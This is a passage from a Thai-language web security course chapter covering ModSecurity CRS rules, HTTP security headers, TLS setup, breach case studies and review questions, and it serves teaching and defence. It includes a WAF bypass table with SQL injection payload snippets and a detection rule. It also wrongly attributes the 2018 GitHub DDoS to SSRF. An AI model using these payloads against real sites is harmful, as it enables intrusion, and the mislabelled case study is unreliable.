+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* "@detectSQLi" \
+    "id:942100,\
+    phase:2,\
+    block,\
+    t:none,t:utf8toUnicode,t:urlDecodeUni,t:removeNulls,\
+    msg:'SQL Injection Detected via libinjection',\
+    logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\
+    tag:'application-multi',\
+    tag:'language-multi',\
+    tag:'platform-multi',\
+    tag:'attack-sqli',\
+    tag:'paranoia-level/1',\
+    tag:'OWASP_CRS',\
+    ver:'OWASP_CRS/4.0.0',\
+    severity:'CRITICAL',\
+    setvar:'tx.anomaly_score_pl1=+%{tx.critical_anomaly_score}'"</pre>
+<p><strong>Anomaly Scoring:</strong> CRS ใช้ระบบคะแนน — Request ที่มีคะแนนรวมเกิน Threshold จะถูก Block:</p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>Normal:      0-5 points   →  Allow
+Suspicious:  5-10 points  →  Log + Maybe Block
+Critical:    10+ points   →  Block + Alert</pre>
+<h3 id="section8-5" class="section-ref">8.5 WAF Bypass Techniques</h3>
+<p>ผู้โจมตีพยายามหลบเลี่ยง WAF ด้วยเทคนิคต่างๆ:</p>
+<div class="table-wrap"><table>
+  <thead><tr><th>เทคนิค WAF Bypass</th><th>ตัวอย่าง</th></tr></thead>
+  <tbody>
+    <tr><td><strong>Encoding</strong></td><td><code>%27%20OR%201%3D1%20--</code> (URL Encode), <code>0x27204f52...</code> (Hex)</td></tr>
+    <tr><td><strong>Case Variation</strong></td><td><code>SeLeCt * FrOm users</code> (ผสมตัวพิมพ์)</td></tr>
+    <tr><td><strong>Comment Injection</strong></td><td><code>SEL/**/ECT * FROM users</code></td></tr>
+    <tr><td><strong>HTTP Parameter Pollution</strong></td><td><code>?id=1&amp;id=2 UNION SELECT...</code></td></tr>
+    <tr><td><strong>HTTP Method Manipulation</strong></td><td>ใช้ PUT/PATCH แทน POST</td></tr>
+    <tr><td><strong>Content-Type Bypass</strong></td><td>ใช้ <code>application/json</code> แทน <code>application/x-www-form-urlencoded</code></td></tr>
+    <tr><td><strong>Unicode Normalization</strong></td><td><code>ſ</code> = <code>s</code> (Unicode Case Mapping)</td></tr>
+    <tr><td><strong>Large Payload</strong></td><td>ส่ง Payload ขนาดใหญ่ — WAF อาจข้ามการตรวจสอบ</td></tr>
+  </tbody>
+</table></div>
+</section>
+<hr>
+
+<!-- SECTION 9 -->
+<section id="section9" class="section-ref">
+<h2>9. HTTP Security Headers</h2>
+<h3 id="section9-1" class="section-ref">9.1 ภาพรวม</h3>
+<p>HTTP Security Headers คือ Headers ที่ Web Server ส่งไปยัง Browser เพื่อบอก Browser ให้ใช้มาตรการรักษาความปลอดภัยบางอย่าง</p>
+<h3 id="section9-2" class="section-ref">9.2 HTTP Strict Transport Security (HSTS)</h3>
+<p>บอก Browser ว่าเว็บไซต์นี้ต้องใช้ HTTPS เท่านั้น — ห้ามใช้ HTTP:</p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>Strict-Transport-Security: max-age=31536000; includeSubDomains; preload</pre>
+<div class="table-wrap"><table>
+  <thead><tr><th>Directive</th><th>คำอธิบาย</th></tr></thead>
+  <tbody>
+    <tr><td><code>max-age=SECONDS</code></td><td>ระยะเวลา (วินาที) ที่ Browser จดจำว่าเว็บนี้ใช้ HTTPS — 31536000 = 1 ปี</td></tr>
+    <tr><td><code>includeSubDomains</code></td><td>ใช้กับ Subdomain ทั้งหมด</td></tr>
+    <tr><td><code>preload</code></td><td>ลงทะเบียนกับ Browser — Browser จะบังคับ HTTPS ก่อนเปิดเว็บครั้งแรก</td></tr>
+  </tbody>
+</table></div>
+<p><strong>ประโยชน์ของ HSTS:</strong> ป้องกัน SSL Stripping Attack — Man-in-the-Middle ที่ Downgrade HTTPS → HTTP, ป้องกัน Cookie Hijacking ผ่าน HTTP</p>
+<h3 id="section9-3" class="section-ref">9.3 X-Frame-Options</h3>
+<p>ป้องกัน Clickjacking — ห้ามไม่ให้หน้าเว็บถูกแสดงใน <code>&lt;iframe&gt;</code> ของเว็บอื่น:</p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>X-Frame-Options: DENY
+X-Frame-Options: SAMEORIGIN</pre>
+<div class="table-wrap"><table>
+  <thead><tr><th>ค่า</th><th>คำอธิบาย</th></tr></thead>
+  <tbody>
+    <tr><td><code>DENY</code></td><td>ไม่สามารถแสดงใน Frame ใดๆ เลย</td></tr>
+    <tr><td><code>SAMEORIGIN</code></td><td>แสดงใน Frame ที่เป็น Same Origin เท่านั้น</td></tr>
+    <tr><td><code>ALLOW-FROM uri</code></td><td>(Deprecated) — ใช้ CSP frame-ancestors แทน</td></tr>
+  </tbody>
+</table></div>
+<h3 id="section9-4" class="section-ref">9.4 X-Content-Type-Options</h3>
+<p>ป้องกัน MIME Type Sniffing — Browser จะไม่พยายามเปลี่ยน Content-Type:</p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>X-Content-Type-Options: nosniff</pre>
+<p><strong>ปัญหา MIME Sniffing:</strong> ผู้โจมตีอัปโหลดไฟล์ <code>image.jpg</code> ที่มี JavaScript ซ่อนอยู่ — Browser อาจ render เป็น HTML แทน</p>
+<h3 id="section9-5" class="section-ref">9.5 Content Security Policy (CSP)</h3>
+<p>CSP คือ Header ที่ควบคุมแหล่งที่มาของ Resource ที่ Browser สามารถโหลดและรันได้:</p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self' 'unsafe-inline'; img-src 'self' data:; object-src 'none'; frame-ancestors 'none'</pre>
+<h3 id="section9-6" class="section-ref">9.6 CSP Directive ที่สำคัญ</h3>
+<div class="table-wrap"><table>
+  <thead><tr><th>Directive</th><th>ควบคุม</th><th>ตัวอย่าง</th></tr></thead>
+  <tbody>
+    <tr><td><code>default-src</code></td><td>ค่าเริ่มต้นสำหรับทุก Resource</td><td><code>default-src 'self'</code></td></tr>
+    <tr><td><code>script-src</code></td><td>JavaScript</td><td><code>script-src 'self' https://trusted-cdn.com</code></td></tr>
+    <tr><td><code>style-src</code></td><td>CSS</td><td><code>style-src 'self' 'unsafe-inline'</code></td></tr>
+    <tr><td><code>img-src</code></td><td>รูปภาพ</td><td><code>img-src 'self' data: https://*.imgur.com</code></td></tr>
+    <tr><td><code>connect-src</code></td><td>XMLHttpRequest, fetch, WebSocket</td><td><code>connect-src 'self' https://api.example.com</code></td></tr>
+    <tr><td><code>frame-src</code></td><td>iframe</td><td><code>frame-src 'none'</code></td></tr>
+    <tr><td><code>frame-ancestors</code></td><td>ใครสามารถ embed หน้านี้ใน iframe</td><td><code>frame-ancestors 'none'</code></td></tr>
+    <tr><td><code>object-src</code></td><td><code>&lt;object&gt;</code>, <code>&lt;embed&gt;</code>, <code>&lt;applet&gt;</code></td><td><code>object-src 'none'</code></td></tr>
+    <tr><td><code>base-uri</code></td><td><code>&lt;base&gt;</code> tag</td><td><code>base-uri 'self'</code></td></tr>
+    <tr><td><code>form-action</code></td><td>ปลายทางของ Form submission</td><td><code>form-action 'self'</code></td></tr>
+    <tr><td><code>report-uri</code> / <code>report-to</code></td><td>URL ส่งรายงานเมื่อ Policy ถูก Violate</td><td><code>report-uri /csp-violation</code></td></tr>
+  </tbody>
+</table></div>
+<h3 id="section9-7" class="section-ref">9.7 ตัวอย่างการกำหนดค่า CSP</h3>
+<p><strong>CSP สำหรับ Web Application ทั่วไป:</strong></p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>Content-Security-Policy:
+    default-src 'self';
+    script-src 'self' https://www.google-analytics.com 'nonce-ABC123';
+    style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+    img-src 'self' data: https://www.google-analytics.com;
+    font-src 'self' https://fonts.gstatic.com;
+    connect-src 'self' https://api.example.com;
+    frame-ancestors 'none';
+    form-action 'self';
+    base-uri 'self';
+    object-src 'none';</pre>
+<p><strong>CSP ในการ Report Mode:</strong></p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>Content-Security-Policy-Report-Only:
+    default-src 'self';
+    script-src 'self';
+    report-uri /csp-report-endpoint;</pre>
+<h3 id="section9-8" class="section-ref">9.8 การใช้ Nonce ใน CSP</h3>
+<p>Nonce คือค่าสุ่มที่เปลี่ยนทุก Request — ใช้บอก Browser ว่า Script ไหนได้รับอนุญาต:</p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>&lt;!-- Server สร้าง Nonce ทุก Request --&gt;
+&lt;script nonce="ABC123"&gt;
+    console.log('safe script');  // ✅ Script นี้ได้รับอนุญาต
+&lt;/script&gt;
+
+&lt;!-- Attack Script (ไม่มี nonce) → ถูก Block --&gt;
+&lt;script&gt;
+    alert('XSS');  // ❌ ถูก Block โดย CSP
+&lt;/script&gt;</pre>
+<h3 id="section9-9" class="section-ref">9.9 ตัวอย่างการกำหนดค่า All-in-One (Nginx)</h3>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button># ใน Server Block
+add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
+add_header X-Frame-Options "DENY" always;
+add_header X-Content-Type-Options "nosniff" always;
+add_header X-XSS-Protection "0" always;  # Deprecated — ใช้ CSP แทน
+add_header Referrer-Policy "strict-origin-when-cross-origin" always;
+add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
+add_header Content-Security-Policy "
+    default-src 'self';
+    script-src 'self' 'nonce-$request_id';
+    style-src 'self' 'unsafe-inline';
+    img-src 'self' data:;
+    object-src 'none';
+    frame-ancestors 'none';
+    form-action 'self';
+    base-uri 'self';
+" always;</pre>
+</section>
+<hr>
+
+<!-- SECTION 10 -->
+<section id="section10" class="section-ref">
+<h2>10. TLS/SSL บนเว็บเซิร์ฟเวอร์</h2>
+<h3 id="section10-1" class="section-ref">10.1 TLS Termination</h3>
+<p>TLS Termination คือจุดที่ Traffic ที่เข้ารหัส HTTPS ถูกถอดรหัส (Decrypt) ก่อนส่งต่อไปยัง Web Server ภายใน:</p>
+<p><strong>TLS Termination at Load Balancer:</strong></p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>[Client] ──HTTPS──▶ [Load Balancer] ──HTTP──▶ [Web Server]
+                     (TLS Termination)        (Unencrypted Internal)</pre>
+<p><strong>TLS Termination at Web Server:</strong></p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>[Client] ──HTTPS──▶ [Web Server] ──HTTP──▶ [App Server]
+                     (TLS Termination)      (Internal Network)</pre>
+<p><strong>TLS Offloading (SSL Offload):</strong></p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>[Client] ──HTTPS──▶ [NGFW/LB] ──HTTP──▶ [Web Server]
+                    ↑ TLS Offloading
+                    Certificate + Private Key อยู่ที่ LB
+                    Web Server ไม่เห็น Certificate เลย</pre>
+<h3 id="section10-2" class="section-ref">10.2 TLS Configuration พื้นฐาน (Nginx)</h3>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>server {
+    listen 443 ssl http2;
+    server_name example.com;
+
+    # Certificate
+    ssl_certificate     /etc/ssl/certs/example.com.pem;
+    ssl_certificate_key /etc/ssl/private/example.com.key;
+
+    # Protocol — ปลอดภัยที่สุดเท่าที่รองรับ
+    ssl_protocols TLSv1.2 TLSv1.3;
+
+    # Cipher Suites
+    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384;
+    ssl_prefer_server_ciphers on;
+
+    # ECDH Key Exchange
+    ssl_ecdh_curve X25519:prime256v1:secp384r1;
+
+    # OCSP Stapling
+    ssl_stapling on;
+    ssl_stapling_verify on;
+    resolver 1.1.1.1 8.8.8.8 valid=300s;
+    resolver_timeout 5s;
+
+    # HSTS
+    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
+}</pre>
+<h3 id="section10-3" class="section-ref">10.3 TLS Certificate Management</h3>
+<div class="table-wrap"><table>
+  <thead><tr><th>กิจกรรม</th><th>รายละเอียด</th></tr></thead>
+  <tbody>
+    <tr><td><strong>Certificate Acquisition</strong></td><td>Let's Encrypt (ACME), ซื้อจาก CA (DigiCert, Sectigo, GlobalSign)</td></tr>
+    <tr><td><strong>Auto-renewal</strong></td><td>Certbot (Let's Encrypt) — renew อัตโนมัติทุก 90 วัน</td></tr>
+    <tr><td><strong>Certificate Validation</strong></td><td>ตรวจสอบ SAN (Subject Alternative Name) ตรงกับ Domain หรือไม่</td></tr>
+    <tr><td><strong>Revocation</strong></td><td>เมื่อ Private Key รั่วหรือ Certificate หมดอายุ</td></tr>
+    <tr><td><strong>Monitoring</strong></td><td>ตรวจสอบ Certificate Expiry — แจ้งเตือนก่อนหมดอายุ 30 วัน</td></tr>
+  </tbody>
+</table></div>
+<h3 id="section10-4" class="section-ref">10.4 การตรวจสอบความปลอดภัย TLS</h3>
+<p>เครื่องมือที่ใช้ตรวจสอบ TLS Configuration:</p>
+<ul>
+  <li><strong>SSL Labs (https://www.ssllabs.com/ssltest/)</strong> — ให้คะแนน A+ สำหรับการตั้งค่าที่ดี</li>
+  <li><strong>testssl.sh</strong> — Script ตรวจสอบ TLS จาก Command Line</li>
+  <li><strong>Nmap Script</strong> — <code>nmap --script ssl-enum-ciphers -p 443 example.com</code></li>
+</ul>
+</section>
+<hr>
+
+<!-- SECTION 11 -->
+<section id="section11" class="section-ref">
+<h2>11. กรณีศึกษา: การโจมตีเว็บไซต์จริง</h2>
+<h3 id="section11-1" class="section-ref">11.1 กรณีศึกษา 1: Equifax Data Breach (2017)</h3>
+<p><strong>รายละเอียด:</strong></p>
+<ul>
+  <li>ข้อมูลรั่วไหล: 147 ล้านคน (ชื่อ, SSN, วันเกิด, ที่อยู่, หมายเลขโทรศัพท์)</li>
+  <li>สาเหตุ: <strong>Apache Struts CVE-2017-5638</strong> — ช่องโหว่ Remote Code Execution</li>
+  <li>ไม่ได้ Patch เป็นเวลา 2 เดือนหลังจาก Patch ออก</li>
+</ul>
+<p><strong>บทเรียน:</strong></p>
+<ol>
+  <li>Patch Management ล้มเหลว — ช่องโหว่ที่รู้จักและมี Patch แล้วแต่ไม่ถูกนำไปใช้</li>
+  <li>Defense in Depth — ถ้ามี WAF ที่ป้องกัน RCE ก็อาจช่วยลดความเสียหายได้</li>
+  <li>Network Segmentation — Database ควรแยกจาก Web Server</li>
+  <li>การสแกนช่องโหว่เป็นประจำสามารถตรวจพบและป้องกันได้</li>
+</ol>
+<h3 id="section11-2" class="section-ref">11.2 กรณีศึกษา 2: GitHub DDoS via SSRF (2018)</h3>
+<p><strong>รายละเอียด:</strong></p>
+<ul>
+  <li>GitHub ถูกโจมตี DDoS ขนาด 1.35 Tbps</li>
+  <li>ใช้เทคนิค Memcached Amplification (DRDoS)</li>
+  <li>ใช้ SSRF ที่ Memcached Server เพื่อ Amplify Traffic</li>
+</ul>
+<p><strong>บทเรียน:</strong></p>
+<ol>
+  <li>ปิด Memcached จากอินเทอร์เน็ต — ไม่ควรเปิด Public</li>
+  <li>SSRF Prevention — ตรวจสอบและจำกัด URL ที่ Fetch</li>
+  <li>DDoS Protection — ใช้ Cloud-based DDoS Mitigation (Cloudflare, Akamai)</li>
+</ol>
+<h3 id="section11-3" class="section-ref">11.3 กรณีศึกษา 3: SolarWinds Supply Chain Attack (2020)</h3>
+<p><strong>รายละเอียด:</strong></p>
+<ul>
+  <li>ผู้โจมตีแทรก Backdoor ในอัปเดตซอฟต์แวร์ Orion</li>
+  <li>ส่งผลกระทบต่อองค์กร 18,000+ แห่ง รวมถึงหน่วยงานรัฐบาลสหรัฐฯ</li>
+  <li>ใช้การโจมตีแบบ Supply Chain — ไม่ใช่ช่องโหว่โดยตรงของ Web App</li>
+</ul>
+<p><strong>บทเรียน:</strong></p>
+<ol>
+  <li>Supply Chain Risk — ตรวจสอบ Third-party Dependencies</li>
+  <li>Code Signing — ตรวจสอบ Integrity ของซอฟต์แวร์ก่อนติดตั้ง</li>
+  <li>Monitoring — ตรวจจับพฤติกรรมผิดปกติหลังการอัปเดต (Beaconing C2)</li>
+</ol>
+<h3 id="section11-4" class="section-ref">11.4 กรณีศึกษา 4: OWASP Top 10 Application Attack</h3>
+<p><strong>ช่องโหว่: SQL Injection ในเว็บร้านค้าออนไลน์</strong></p>
+<pre><button class="copy-btn" onclick="copyCode(this)" aria-label="คัดลอก"><i class="fas fa-copy" aria-hidden="true"></i> คัดลอก</button>Attack:
+1. ผู้โจมตีพบว่าช่อง Search Product มี SQL Injection
+2. UNION SELECT ดึงข้อมูล users table
+3. ได้ Admin Credentials
+4. ล็อกอินเป็น Admin
+5. เข้าถึง Customer Database (ชื่อ, ที่อยู่, บัตรเครดิต)
+
+แนวทางป้องกัน:
+├── Parameterized Query
+├── WAF (ModSecurity + CRS)
+├── Input Validation
+├── Least Privilege DB Account
+└── เข้ารหัสข้อมูลอ่อนไหวใน Database (Credit Card Numbers)</pre>
+</section>
+<hr>
+
+<!-- SUMMARY -->
+<section id="summary" class="section-ref">
+<h2><i class="fas fa-list-check" aria-hidden="true"></i> สรุปท้ายบท (Chapter Summary)</h2>
+<ol>
+  <li><strong>SQL Injection</strong> — แทรกคำสั่ง SQL ผ่าน Input — ป้องกันด้วย Parameterized Query (Prepared Statement), WAF, Least Privilege</li>
+  <li><strong>XSS</strong> — แทรก JavaScript ในหน้าเว็บ — ป้องกันด้วย Output Encoding, CSP, HttpOnly Cookie</li>
+  <li><strong>CSRF</strong> — หลอกให้ผู้ใช้ส่ง Request โดยไม่ตั้งใจ — ป้องกันด้วย CSRF Token, SameSite Cookie, Custom Header</li>
+  <li><strong>SSRF</strong> — บังคับ Server ให้ Request URL ที่ผู้โจมตีกำหนด — ป้องกันด้วย URL Whitelist, Block Internal IPs, Network Segmentation</li>
+  <li><strong>Same-Origin Policy (SOP)</strong> — ป้องกัน Cross-Origin Data Access — CORS เป็นกลไกที่ผ่อนปรน SOP อย่างปลอดภัย</li>
+  <li><strong>WAF</strong> — ตรวจสอบ HTTP Traffic ป้องกันการโจมตี — ModSecurity + OWASP CRS เป็น Open Source Solution ที่ดี</li>
+  <li><strong>HTTP Security Headers</strong> — HSTS (บังคับ HTTPS), CSP (ควบคุม Resource), X-Frame-Options (ป้องกัน Clickjacking), X-Content-Type-Options (ป้องกัน MIME Sniffing)</li>
+  <li><strong>TLS บนเว็บเซิร์ฟเวอร์</strong> — ใช้ TLS 1.2/1.3, Cipher ที่ปลอดภัย, OCSP Stapling, HSTS</li>
+  <li><strong>กรณีศึกษา</strong> แสดงให้เห็นว่าช่องโหว่ Web Application มีผลกระทบสูง — Patch Management, Defense in Depth, และ Monitoring มีความสำคัญ</li>
+</ol>
+</section>
+<hr>
+
+<!-- REVIEW QUESTIONS -->
+<section id="review-questions" class="section-ref">
+<h2><i class="fas fa-question-circle" aria-hidden="true"></i> คำถามทบทวน (Review Questions)</h2>
+<p style="color:var(--text-secondary);margin-bottom:1.5rem;">คลิกปุ่ม <strong>"ดูเฉลย"</strong> เพื่อเปิดคำตอบ</p>
+
+<div class="quiz-card" data-question="1">
+  <div class="quiz-question">
+    <span class="q-number">ข้อ 1</span>
+    <p>จงอธิบายความแตกต่างระหว่าง SQL Injection แบบ In-band, Blind, และ Out-of-band พร้อมยกตัวอย่าง</p>
+  </div>
+  <button class="reveal-btn" onclick="revealAnswer(this)">ดูเฉลย</button>
+  <div class="quiz-answer hidden">
+    <p><strong>เฉลย:</strong> <strong>In-band (Classic):</strong> ใช้ Channel เดียวกันในการโจมตีและรับผลลัพธ์ — เช่น UNION SELECT ที่ผลลัพธ์แสดงบนหน้าเว็บโดยตรง <strong>Blind (Inferential):</strong> ไม่เห็นผลลัพธ์โดยตรง ต้องอนุมานจาก Behavior — Boolean-based ใช้เงื่อนไข True/False, Time-based ใช้ Delay <strong>Out-of-band:</strong> ใช้ Channel แยกในการรับข้อมูล เช่น DNS Lookup หรือ HTTP Request ไปยัง Server ของผู้โจมตี</p>
+  </div>
+</div>
+
+<div class="quiz-card" data-question="2">
+  <div class="quiz-question">
+    <span class="q-number">ข้อ 2</span>
+    <p>Reflected XSS แตกต่างจาก Stored XSS และ DOM-based XSS อย่างไร จงยกตัวอย่างแต่ละประเภท</p>
+  </div>
+  <button class="reveal-btn" onclick="revealAnswer(this)">ดูเฉลย</button>
+  <div class="quiz-answer hidden">
+    <p><strong>เฉลย:</strong> <strong>Reflected XSS:</strong> Payload อยู่ใน Request และสะท้อนกลับใน Response ทันที — ไม่เก็บใน Server ต้องให้เหยื่อคลิก Link <strong>Stored XSS:</strong> Payload ถูกบันทึกใน Database — รุนแรงที่สุดเพราะไม่ต้องหลอกให้คลิก Link เช่น Comment Box <strong>DOM-based XSS:</strong> Payload ทำงานผ่าน DOM ใน Browser โดย Server ไม่ได้ส่ง HTML ที่มีอันตราย — เกิดจาก Client-side JavaScript ที่เขียนข้อมูลจาก Source ที่ไม่น่าเชื่อถือลงใน DOM ด้วย innerHTML</p>
+  </div>
+</div>
+
+<div class="quiz-card" data-question="3">
+  <div class="quiz-question">
+    <span class="q-number">ข้อ 3</span>
+    <p>CSRF ทำงานอย่างไร และเหตุใด Same-Origin Policy ไม่สามารถป้องกัน CSRF ได้? จงอธิบายและเสนอแนวทางป้องกัน 3 วิธี</p>
+  </div>
+  <button class="reveal-btn" onclick="revealAnswer(this)">ดูเฉลย</button>
+  <div class="quiz-answer hidden">
+    <p><strong>เฉลย:</strong> <strong>CSRF ทำงาน:</strong> ผู้โจมตีหลอกให้ผู้ใช้ที่ล็อกอินอยู่ส่ง Request ไปยังเว็บเป้าหมาย Cookie ถูกแนบโดยอัตโนมัติ เซิร์ฟเวอร์จึงคิดว่าเป็น Request จากผู้ใช้จริง <strong>SOP ไม่ป้องกัน CSRF:</strong> SOP จำกัด JavaScript ในการอ่าน Response จาก Cross-Origin แต่ไม่ได้บังคับว่า Tag เช่น img, form จะส่ง Request ข้าม Origin ไม่ได้ — Form และ Image Tag ส่ง Cookie ข้าม Origin ได้ <strong>แนวทางป้องกัน:</strong> (1) CSRF Token — สร้าง Token แบบสุ่ม (2) SameSite Cookie — ใช้ SameSite=Strict หรือ Lax (3) Custom Header Validation — ใช้ JavaScript ส่ง Custom Header ที่ Browser จะไม่ส่งจาก Cross-Origin</p>
+  </div>
+</div>
+
+<div class="quiz-card" data-question="4">
+  <div class="quiz-question">
+    <span class="q-number">ข้อ 4</span>
+    <p>SSRF คืออะไร และเหตุใด SSRF จึงเป็นอันตรายต่อ Cloud-hosted Applications?</p>
+  </div>
+  <button class="reveal-btn" onclick="revealAnswer(this)">ดูเฉลย</button>
+  <div class="quiz-answer hidden">
+    <p><strong>เฉลย:</strong> <strong>SSRF คือ:</strong> การโจมตีที่ผู้โจมตีบังคับให้ Server ทำ Request ไปยัง URL ที่กำหนด <strong>อันตรายต่อ Cloud:</strong> Cloud มี Metadata Endpoint (เช่น AWS 169.254.169.254) ที่เก็บ Credentials, IAM Role — SSRF สามารถเข้าถึง Endpoint เหล่านี้เพื่อขโมย Credentials <strong>แนวทางป้องกัน:</strong> (1) Whitelist URLs (2) Block Private IPs และ Metadata Endpoints (3) Validate URL Scheme (4) DNS Resolution Validation (5) Network Segmentation</p>
+  </div>
+</div>
+
+<div class="quiz-card" data-question="5">
+  <div class="quiz-question">
+    <span class="q-number">ข้อ 5</span>
+    <p>จงอธิบายความแตกต่างระหว่าง SOP และ CORS พร้อมตัวอย่าง HTTP Headers</p>
+  </div>
+  <button class="reveal-btn" onclick="revealAnswer(this)">ดูเฉลย</button>
+  <div class="quiz-answer hidden">
+    <p><strong>เฉลย:</strong> <strong>SOP:</strong> กลไกความปลอดภัยที่จำกัด Script จาก Origin หนึ่งในการเข้าถึง Resource จากอีก Origin — Origin = Protocol + Host + Port <strong>CORS:</strong> กลไกที่ผ่อนปรน SOP โดยใช้ HTTP Headers ตัวอย่าง: <code>Access-Control-Allow-Origin: https://frontend.example.com</code>, <code>Access-Control-Allow-Methods: GET, POST</code>, <code>Access-Control-Max-Age: 86400</code> Preflight Request ใช้ OPTIONS ก่อน Request จริง</p>
+  </div>
+</div>
+
+<div class="quiz-card" data-question="6">
+  <div class="quiz-question">
+    <span class="q-number">ข้อ 6</span>
+    <p>WAF ที่ใช้ ModSecurity + OWASP CRS ใช้ Anomaly Scoring อย่างไร?</p>
+  </div>
+  <button class="reveal-btn" onclick="revealAnswer(this)">ดูเฉลย</button>
+  <div class="quiz-answer hidden">
+    <p><strong>เฉลย:</strong> <strong>Anomaly Scoring:</strong> ทุก Rule ที่จับคู่จะเพิ่มคะแนนตาม Severity <strong>กระบวนการ:</strong> (1) Request เข้ามา WAF ตรวจสอบทีละ Rule (2) Rule แต่ละตัวมี ID และ Paranoia Level (3) เมื่อ Rule จับคู่ได้จะเพิ่มคะแนน (4) คะแนนรวมถูกตรวจสอบเมื่อจบ Phase (5) เกิน Threshold จะถูก Block <strong>Threshold:</strong> 0-5 = Allow, 5-10 = Log + Maybe Block, 10+ = Block + Alert</p>
+  </div>
+</div>
+
+<div class="quiz-card" data-question="7">
+  <div class="quiz-question">
+    <span class="q-number">ข้อ 7</span>
+    <p>จงเขียน CSP สำหรับเว็บที่ใช้ React (CDN), Google Analytics, และ Images จาก S3 Bucket</p>
+  </div>
+  <button class="reveal-btn" onclick="revealAnswer(this)">ดูเฉลย</button>
+  <div class="quiz-answer hidden">
+    <p><strong>เฉลย:</strong> <code>Content-Security-Policy: default-src 'self'; script-src 'self' https://unpkg.com/react@18 https://www.googletagmanager.com 'nonce-RANDOM123'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https://your-bucket.s3.amazonaws.com; connect-src 'self' https://www.google-analytics.com; font-src 'self'; object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'self';</code> script-src อนุญาต React จาก CDN และ GA พร้อม Nonce, img-src อนุญาต S3, connect-src อนุญาต Analytics, frame-ancestors 'none' ป้องกัน Clickjacking</p>
+  </div>
+</div>
+
+<div class="quiz-card" data-question="8">
+  <div class="quiz-question">
+    <span class="q-number">ข้อ 8</span>
+    <p>จงอธิบาย HTTP Security Headers: HSTS, X-Frame-Options, X-Content-Type-Options, และ SameSite Cookie</p>
+  </div>
+  <button class="reveal-btn" onclick="revealAnswer(this)">ดูเฉลย</button>
+  <div class="quiz-answer hidden">
+    <p><strong>เฉลย:</strong> <strong>HSTS:</strong> บอก Browser ว่าต้องใช้ HTTPS เท่านั้น — ป้องกัน SSL Stripping และ Cookie Hijacking <strong>X-Frame-Options:</strong> ห้ามแสดงใน iframe ของเว็บอื่น — ป้องกัน Clickjacking ค่า DENY หรือ SAMEORIGIN <strong>X-Content-Type-Options:</strong> ห้าม Browser เปลี่ยน Content-Type — ป้องกัน MIME Sniffing ใช้ค่า nosniff <strong>SameSite Cookie:</strong> ควบคุมว่า Cookie ส่งใน Cross-Site Request หรือไม่ — Strict/Lax/None ป้องกัน CSRF</p>
+  </div>
+</div>
+
+<div class="quiz-card" data-question="9">
+  <div class="quiz-question">
+    <span class="q-number">ข้อ 9</span>
+    <p>จากกรณีศึกษา Equifax Data Breach จงวิเคราะห์ว่ามาตรการป้องกันใดที่จะช่วยลดความรุนแรง</p>
+  </div>
+  <button class="reveal-btn" onclick="revealAnswer(this)">ดูเฉลย</button>
+  <div class="quiz-answer hidden">
+    <p><strong>เฉลย:</strong> <strong>มาตรการที่ช่วยลดความรุนแรง:</strong> (1) Patch Management — Apache Struts CVE-2017-5638 มี Patch แล้วแต่ไม่ถูกนำไปใช้เป็นเวลา 2 เดือน (2) WAF — ModSecurity + OWASP CRS สามารถบล็อก RCE Payload ได้ (3) Network Segmentation — ถ้า Database แยกจาก Web Server ความเสียหายจะจำกัดอยู่ที่ Web Tier (4) Vulnerability Scanning — สแกนช่องโหว่เป็นประจำจะพบก่อนถูกโจมตี (5) Monitoring — ตรวจจับพฤติกรรมผิดปกติ (Data Exfiltration) ได้เร็วขึ้น <strong>บทเรียน:</strong> Defense in Depth — ต้องมีหลายชั้นป้องกัน ไม่พึ่งพาชั้นเดียว</p>
+  </div>
+</div>
+
+<div class="quiz-card" data-question="10">
+  <div class="quiz-question">
+    <span class="q-number">ข้อ 10</span>
